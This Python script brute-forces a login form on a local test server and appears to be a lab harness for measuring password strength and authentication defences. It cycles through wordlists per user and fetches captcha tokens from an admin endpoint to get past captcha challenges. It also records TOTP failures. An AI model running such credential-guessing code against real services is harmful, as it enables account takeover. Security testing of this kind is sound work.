from server.util import get_usernames_by_category, generate_sequences
import requests, time, yaml

with open("config.yaml", "r") as f:
    APP_CONFIG = yaml.safe_load(f)
PASS_LEVEL = APP_CONFIG["config"]["pass_level"]

LOGIN_URL = "http://127.0.0.1:5000/login"
LOGIN_TOTP_URL = "http://127.0.0.1:5000/login_totp"
CAPTCHA_URL = "http://127.0.0.1:5000/admin/get_captcha_token"
GROUP_SEED = 114467408
MAX_DURATION = 7200 #this is two hours 
MAX_ATTEMPTS = 300000


PASS_FILE = f"bf_passwords/{PASS_LEVEL}pass.txt"

#Getting the user's name to attack.
USERS = get_usernames_by_category(PASS_LEVEL)

#Starting clock, the attack need to be no more then tow hours.
def brute_rorce():
    start = time.perf_counter()
    for user in USERS:
        if PASS_LEVEL != "weak":
            generate_sequences(PASS_LEVEL, PASS_FILE, user, 5)
        with open(PASS_FILE, "r") as f:
            for attempt_num, password in enumerate(f, start=1):
                password = password.strip()
                elapsed_time = time.perf_counter() - start
                if attempt_num > MAX_ATTEMPTS: #Attempts limit.
                    print("next user")
                    break
                if elapsed_time < MAX_DURATION: #Duration limit.
                    response = requests.post(
                        LOGIN_URL,
                        data={
                            "username": user,
                            "password": password
                        }
                    )
                    success, code_resp = "/dashboard" in response.url, response.status_code
                    
                    if success:
                        break
                    
                    if code_resp == 603: #If captcha is required
                        data = response.json()

                        if data.get("captcha_required"):
                            captcha = requests.post(
                                CAPTCHA_URL ,
                                data={"group_seed":GROUP_SEED},
                                cookies=response.cookies
                                )
                                    
                            data_captcha = captcha.json()
                                
                            if not data_captcha.get("captcha_required"):
                                response = requests.post(
                                    LOGIN_URL,
                                    data={
                                        "username": user,
                                        "password": password,
                                        "captcha_token": data_captcha.get("captcha_token")
                                    },
                                    cookies=response.cookies
                                )  
                                success, code_resp = "/dashboard" in response.url, response.status_code 
                                if success:
                                    break
                    if code_resp == 503: #If TOTP is required
                        totp_response = requests.post(
                            LOGIN_TOTP_URL,  # TOTP verification URL
                            data={
                                "TOTP_token": ''
                            },
                            cookies=response.cookies  #Retain session (cookies) to maintain state
                        )
                        #Log the failure (simulating a TOTP fail)
                        if totp_response.status_code == 501:
                            print(f"TOTP fail for user {user} with password {password}")
                        break 

                    if code_resp == 429: #If rate-limit or lockout.
                        break
                
                else:
                    print(f"Time limit reached ({elapsed_time:.2f}s)Shutting down.")
                    break
                time.sleep(0.05)